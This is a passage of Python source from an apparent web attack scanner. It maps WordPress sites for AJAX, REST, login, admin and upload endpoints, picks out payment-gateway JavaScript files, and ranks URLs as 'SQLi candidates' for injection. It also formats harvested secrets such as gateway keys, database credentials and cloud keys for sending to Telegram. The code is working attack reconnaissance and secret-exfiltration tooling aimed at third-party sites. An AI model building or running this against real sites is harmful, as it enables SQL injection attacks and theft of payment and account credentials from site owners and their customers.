            info['form_type'] = 'WooCommerce'
        elif 'give-form' in html_lower or 'give_vars' in html_lower or 'give-donation' in html_lower:
            info['form_type'] = 'GiveWP'
        elif ('gravityforms' in html_lower or 'gform_submit' in html_lower or
              'gform_wrapper' in html_lower):
            info['form_type'] = 'Gravity Forms'
        elif 'wpforms' in html_lower or 'wpforms-submit' in html_lower:
            info['form_type'] = 'WPForms'
        elif 'ninja-forms' in html_lower:
            info['form_type'] = 'Ninja Forms'
        elif 'formidable' in html_lower:
            info['form_type'] = 'Formidable Forms'
        elif 'elementor-form' in html_lower:
            info['form_type'] = 'Elementor Forms'
        elif 'wpcf7' in html_lower or 'contact-form-7' in html_lower:
            info['form_type'] = 'Contact Form 7'
        
        # AJAX
        if 'admin-ajax.php' in html_lower or 'ajaxurl' in html_lower:
            info['has_ajax'] = True
        
        # Nonces — must be actual WP nonce values, not just the word
        if re.search(r'_wpnonce["\s:=]+["\']?[a-f0-9]{8,}', html, re.I):
            info['has_nonce'] = True
        elif re.search(r'nonce["\s:=]+["\']?[a-f0-9]{8,}', html, re.I):
            info['has_nonce'] = True
        
        # Captcha
        if 'recaptcha' in html_lower or 'hcaptcha' in html_lower or 'turnstile' in html_lower:
            info['has_captcha'] = True
        
        return info

    def discover_endpoints(self, html: str, base_url: str) -> dict:
        """Discover all interesting endpoints from page HTML.
        
        Finds:
        - AJAX endpoints (admin-ajax.php, wc-ajax, custom)
        - REST API endpoints (wp-json)
        - Form action URLs
        - Login/admin pages
        - File upload endpoints
        - Search endpoints
        - URLs with parameters (SQLi candidates)
        - External API calls
        """
        from urllib.parse import urljoin, urlparse as _urlparse
        
        parsed = _urlparse(base_url)
        domain = parsed.netloc
        endpoints = {
            "ajax_endpoints": [],
            "rest_api": [],
            "form_actions": [],
            "login_pages": [],
            "search_endpoints": [],
            "param_urls": [],  # URLs with ?param= (SQLi candidates)
            "file_upload": [],
            "admin_pages": [],
            "api_calls": [],
            "interesting_js": [],
        }
        
        # 1. AJAX endpoints
        ajax_matches = re.findall(
            r'["\']([^"\']*/admin-ajax\.php[^"\']*)["\'\s]', html, re.I
        )
        for m in ajax_matches:
            full = urljoin(base_url, m)
            if full not in endpoints['ajax_endpoints']:
                endpoints['ajax_endpoints'].append(full)
        
        # WC-AJAX endpoints
        wc_ajax = re.findall(
            r'["\']([^"\']*/\?wc-ajax=[^"\']*)["\'\s]', html, re.I
        )
        for m in wc_ajax:
            full = urljoin(base_url, m)
            if full not in endpoints['ajax_endpoints']:
                endpoints['ajax_endpoints'].append(full)
        
        # ajaxurl variable
        ajaxurl_match = re.search(
            r'ajaxurl["\s:=]+["\']([^"\']*/admin-ajax\.php)["\']', html, re.I
        )
        if ajaxurl_match:
            full = urljoin(base_url, ajaxurl_match.group(1).replace('\\/', '/'))
            if full not in endpoints['ajax_endpoints']:
                endpoints['ajax_endpoints'].append(full)
        
        # 2. REST API endpoints
        rest_matches = re.findall(
            r'["\']([^"\']*/wp-json/[^"\']*)["\'\s]', html, re.I
        )
        for m in rest_matches:
            full = urljoin(base_url, m.replace('\\/', '/').split('&amp;')[0])
            if full not in endpoints['rest_api']:
                endpoints['rest_api'].append(full)
        
        # Generic API endpoints
        api_matches = re.findall(
            r'["\']([^"\']*/api/v[0-9]+/[^"\']*)["\'\s]', html, re.I
        )
        for m in api_matches:
            full = urljoin(base_url, m)
            if _urlparse(full).netloc == domain and full not in endpoints['rest_api']:
                endpoints['rest_api'].append(full)
        
        # 3. Form action URLs
        form_actions = re.findall(
            r'<form[^>]*action=["\']([^"\']*)["\'\s]', html, re.I
        )
        for action in form_actions:
            if action and action != '#' and not action.startswith('javascript:'):
                full = urljoin(base_url, action)
                if full not in endpoints['form_actions']:
                    endpoints['form_actions'].append(full)
        
        # 4. Login/admin pages
        login_patterns = re.findall(
            r'href=["\']([^"\']*/(?:wp-login|login|signin|admin|wp-admin|account|user|auth)[^"\']*)["\'\s]',
            html, re.I
        )
        for m in login_patterns:
            full = urljoin(base_url, m)
            if _urlparse(full).netloc == domain:
                if full not in endpoints['login_pages']:
                    endpoints['login_pages'].append(full)
        
        # 5. Search endpoints
        search_patterns = re.findall(
            r'action=["\']([^"\']*)["\'\s][^>]*>\s*(?:<[^>]*>)*\s*<input[^>]*name=["\']s["\'\s]',
            html, re.I
        )
        for m in search_patterns:
            full = urljoin(base_url, m) if m else base_url
            endpoints['search_endpoints'].append(full + '?s=')
        if not endpoints['search_endpoints']:
            # Check for standard WP search
            if 'wp-content' in html.lower():
                endpoints['search_endpoints'].append(base_url + '/?s=')
        
        # 6. URLs with parameters (SQLi candidates)
        param_urls = re.findall(
            r'href=["\']([^"\']*/[^"\']* \?[^"\']*)["\'\s]', html, re.I
        )
        # Simpler pattern for URLs with query params
        param_urls2 = re.findall(
            r'href=["\']([^"\s]*\?[a-zA-Z_]+=(?:[^"\']|%)[^"\']*)["\'\s]', html, re.I
        )
        for m in param_urls + param_urls2:
            full = urljoin(base_url, m)
            p = _urlparse(full)
            # Only same-domain, with real params
            if p.netloc == domain and p.query and full not in endpoints['param_urls']:
                endpoints['param_urls'].append(full)
        
        # 7. File upload endpoints
        upload_matches = re.findall(
            r'<input[^>]*type=["\']file["\'\s][^>]*>', html, re.I
        )
        if upload_matches:
            # Find the parent form
            for form_match in re.finditer(r'<form[^>]*action=["\']([^"\']*)["\'\s][^>]*>([\s\S]{0,2000}?)</form>', html, re.I):
                if 'type="file"' in form_match.group(2) or "type='file'" in form_match.group(2):
                    full = urljoin(base_url, form_match.group(1))
                    endpoints['file_upload'].append(full)
        
        # 8. Admin pages
        admin_patterns = re.findall(
            r'href=["\']([^"\']*/(?:wp-admin|admin|administrator|backend|dashboard|cpanel)[^"\']*)["\'\s]',
            html, re.I
        )
        for m in admin_patterns:
            full = urljoin(base_url, m)
            if _urlparse(full).netloc == domain and full not in endpoints['admin_pages']:
                endpoints['admin_pages'].append(full)
        
        # 9. Interesting JS files (config, gateway, checkout)
        js_files = re.findall(
            r'src=["\']([^"\']*/(?:config|settings|gateway|checkout|payment|billing|stripe|braintree|paypal)[^"\']*.js[^"\']*)["\'\s]',
            html, re.I
        )
        for m in js_files:
            full = urljoin(base_url, m)
            if full not in endpoints['interesting_js']:
                endpoints['interesting_js'].append(full)
        
        # 10. External API calls embedded in JS
        try:
            ext_api = re.findall(
                r'["\'](https?://(?!' + re.escape(domain) + r')[^"\']*?/api/[^"\']*)["\'\s]',
                html, re.I
            )
        except Exception:
            ext_api = []
        for m in ext_api[:10]:
            if m not in endpoints['api_calls']:
                endpoints['api_calls'].append(m)
        
        # 11. Swagger UI / OpenAPI spec discovery
        swagger_spec_urls = []
        # SwaggerUIBundle({ url: "..." })
        swagger_bundle = re.findall(
            r'SwaggerUIBundle\s*\(\s*\{[^}]*?url\s*:\s*["\']([^"\']+)["\']',
            html, re.DOTALL | re.I
        )
        for m in swagger_bundle:
            full = urljoin(base_url, m)
            if full not in swagger_spec_urls:
                swagger_spec_urls.append(full)
        # spec-url / specUrl / configUrl
        spec_url_matches = re.findall(
            r'(?:spec[_-]?url|specUrl|configUrl)\s*[=:]\s*["\']([^"\']+)["\']',
            html, re.I
        )
        for m in spec_url_matches:
            full = urljoin(base_url, m)
            if full not in swagger_spec_urls:
                swagger_spec_urls.append(full)
        # Links to swagger/openapi JSON/YAML
        spec_links = re.findall(
            r'(?:href|src)=["\']([^"\']*(?:swagger|openapi|api-docs)[^"\']*\.(?:json|yaml|yml))["\']',
            html, re.I
        )
        for m in spec_links:
            full = urljoin(base_url, m)
            if full not in swagger_spec_urls:
                swagger_spec_urls.append(full)
        # Swagger UI indicators (swagger-ui CSS/JS)
        if re.search(r'swagger-ui(?:-bundle|-standalone-preset)?(?:\.min)?\.(?:js|css)', html, re.I):
            # Page is a Swagger UI — mark it
            if base_url not in swagger_spec_urls:
                swagger_spec_urls.insert(0, base_url + "/swagger.json")
                swagger_spec_urls.insert(1, base_url + "/openapi.json")
        endpoints['swagger_spec_urls'] = swagger_spec_urls

        return endpoints

    def get_sqli_candidates(self, endpoints: dict, base_url: str) -> list:
        """Extract URLs most likely to be SQLi-injectable from discovered endpoints.
        
        Returns list of dicts: {url, type, priority}
        Priority: 1=highest (param URLs), 2=medium (search, forms), 3=lower (API)
        """
        candidates = []
        seen = set()
        
        # Priority 1: URLs with existing parameters (direct injection targets)
        for url in endpoints.get('param_urls', []):
            if url not in seen:
                seen.add(url)
                candidates.append({"url": url, "type": "parameter_url", "priority": 1})
        
        # Priority 2: Search endpoints
        for url in endpoints.get('search_endpoints', []):
            test_url = url + "test'"
            if test_url not in seen:
                seen.add(test_url)
                candidates.append({"url": url + "test", "type": "search", "priority": 2})
        
        # Priority 2: Form action URLs with parameters
        for url in endpoints.get('form_actions', []):
            if '?' in url and url not in seen:
                seen.add(url)
                candidates.append({"url": url, "type": "form_action", "priority": 2})
        
        # Priority 3: REST API endpoints with IDs
        for url in endpoints.get('rest_api', []):
            # wp-json/wp/v2/pages/2 → try injection on the ID param
            if re.search(r'/(?:pages|posts|users|comments|products|orders)/\d+', url, re.I):
                if url not in seen:
                    seen.add(url)
                    candidates.append({"url": url, "type": "rest_api", "priority": 3})
        
        # Priority 3: AJAX endpoints (need action parameter)
        for url in endpoints.get('ajax_endpoints', []):
            if url not in seen:
                seen.add(url)
                candidates.append({"url": url + "?action=test&id=1", "type": "ajax", "priority": 3})
        
        # Priority 2: Login pages (often have user lookup SQLi)
        for url in endpoints.get('login_pages', []):
            if url not in seen:
                seen.add(url)
                candidates.append({"url": url, "type": "login", "priority": 2})
        
        # Sort by priority
        candidates.sort(key=lambda x: x['priority'])
        
        return candidates

    def format_for_telegram(self, secrets: List[ExtractedSecret]) -> str:
        """Format secrets for Telegram reporting."""
        if not secrets:
            return ""
        
        lines = []
        
        # Group by category
        by_category: Dict[str, List[ExtractedSecret]] = {}
        for s in secrets:
            by_category.setdefault(s.category, []).append(s)
        
        category_icons = {
            "gateway": "🔑",
            "cloud": "☁️",
            "database": "🗄️",
            "api": "🔗",
            "credential": "🔐",
            "config": "⚙️",
        }
        
        for category, items in by_category.items():
            icon = category_icons.get(category, "📌")
            lines.append(f"\n{icon} <b>{category.upper()}</b>")
            
            for s in items:
                lines.append(f"  <b>{s.key_name}</b>")
                lines.append(f"  <code>{s.value}</code>")
                lines.append(f"  📍 {s.url}")
                lines.append("")
        
        return "\n".join(lines)
